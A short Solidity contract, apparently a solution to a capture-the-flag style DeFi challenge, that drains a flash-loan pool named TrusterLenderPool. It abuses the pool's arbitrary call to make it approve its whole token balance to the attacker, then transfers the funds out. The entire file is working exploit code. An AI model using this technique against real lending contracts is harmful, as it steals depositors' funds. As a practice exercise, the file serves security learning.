// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

/** EXPLOIT: The flashLoan function calls an address with the data we provide. 
    This allows us to aprove spending of the flash loan contract balance 
    and then transfer the aproved tokens from the flash loan contract. **/
contract TrusterAttack {
    function attack ( address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        uint balanceOfPool = token.balanceOf(_pool);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), balanceOfPool
        );

        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool , msg.sender, balanceOfPool);
    }
}